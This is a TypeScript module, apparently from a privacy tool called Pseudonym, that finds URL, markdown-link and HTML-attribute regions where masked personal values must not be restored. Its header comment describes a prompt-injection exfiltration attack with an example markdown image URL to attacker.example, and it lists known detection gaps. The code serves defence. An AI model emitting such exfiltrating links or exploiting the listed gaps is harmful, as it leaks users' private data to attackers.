// Regions of text where a restored value must not be written back
// (restoration safety, CLAUDE.md): URLs, markdown link/image targets, and
// HTML attribute values (including `mailto:`). The concrete attack this
// defends against: injected text makes the model output
// `![x](https://attacker.example/?d=[AADHAAR_1])`; if Pseudonym restored the
// real value there, the user's own client would leak it fetching the image
// when it renders the answer. This is not a defence against prompt
// injection in general - only this one exfiltration path - and the
// README/threat model must say so.
//
// Pattern matching, not a URL/HTML/markdown parser, so it leans towards
// marking too much. A markdown destination is either `<…>` up to its closing
// ">" (CommonMark lets that form contain spaces) or runs to the first
// whitespace, not to the first ")": CommonMark allows balanced parentheses
// inside one, so stopping at ")" let `(1)[AADHAAR_1]` escape (bug-log 13).
// The unbracketed form also takes the closing ")" and anything glued after
// it; a placeholder glued to the end of a link is left unrestored, the safe
// side. The same destination grammar applies after "](" (inline links and
// images) and after "[label]:" (reference definitions, which an image uses as
// `![x][label]`; bug-log 14). The reference pattern is not anchored to the
// start of a line, so it also covers definitions inside block quotes and
// list items; the cost is that the token after any "[…]:" in prose is left
// unrestored. Known gaps, all
// outside the automatic image-fetch path (see the Phase 8 threat-model
// notes in CLAUDE.md):
//  - a bare host with no scheme and no "/" (`a.example?d=…`), and a bare IP
//    address with no scheme (`203.0.113.9/?d=…`), in plain text: a client
//    fetches neither on its own; a user would have to click a linkified one;
//  - an unquoted HTML attribute that does not look like a URL
//    (`<img src=a.example?d=…>` is relative to the client's own site);
//  - an HTML attribute whose value is not a URL at all is still marked
//    unsafe (any quoted value), the safe side.

import type { Span } from '../detection/normalise.js';

const MARKDOWN_TARGET = /\]\(\s*(<[^>\n]*>|[^\s]*)/dg;
const REFERENCE_DEFINITION = /\[(?:[^\]\\\n]|\\.)+\]:\s*(<[^>\n]*>|[^\s]+)/dg;
const HTML_ATTRIBUTE_VALUE = /=\s*(?:"([^"]*)"|'([^']*)')/dg;
// Quotes are excluded too: without that, a bare-URL pattern matching the same
// text as a quoted HTML attribute value would run one character past its
// closing quote, merging (see below) into a region one character too wide.
const SCHEME_URL = /\b(?:[a-zA-Z][a-zA-Z0-9+.-]*:\/\/|mailto:)[^\s<>()"']+/g;
const BARE_HOST_URL = /\b(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,}\/[^\s<>()"']*/gi;

// The five patterns above often find the same URL more than once (a bare
// scheme URL inside a markdown target, or inside a quoted HTML attribute);
// merging keeps `unsafeRegions` a plain, non-overlapping list.
function mergeRegions(regions: readonly Span[]): Span[] {
  const sorted = [...regions].sort((a, b) => a.start - b.start || a.end - b.end);
  const merged: { start: number; end: number }[] = [];
  for (const region of sorted) {
    const last = merged.at(-1);
    if (last && region.start <= last.end) last.end = Math.max(last.end, region.end);
    else merged.push({ ...region });
  }
  return merged;
}

/** Every unsafe region in `text`, sorted by start, merged, never overlapping. */
export function unsafeRegions(text: string): Span[] {
  const regions: Span[] = [];

  for (const pattern of [MARKDOWN_TARGET, REFERENCE_DEFINITION]) {
    for (const match of text.matchAll(pattern)) {
      const [start, end] = match.indices![1]!;
      regions.push({ start, end });
    }
  }
  for (const match of text.matchAll(HTML_ATTRIBUTE_VALUE)) {
    const [start, end] = (match.indices![1] ?? match.indices![2])!;
    regions.push({ start, end });
  }
  for (const match of text.matchAll(SCHEME_URL)) {
    regions.push({ start: match.index, end: match.index + match[0].length });
  }
  for (const match of text.matchAll(BARE_HOST_URL)) {
    regions.push({ start: match.index, end: match.index + match[0].length });
  }

  return mergeRegions(regions);
}

/** True if `[start, end)` overlaps any region (`regions` need not be sorted). */
export function isInUnsafeRegion(regions: readonly Span[], start: number, end: number): boolean {
  return regions.some((region) => region.start < end && start < region.end);
}
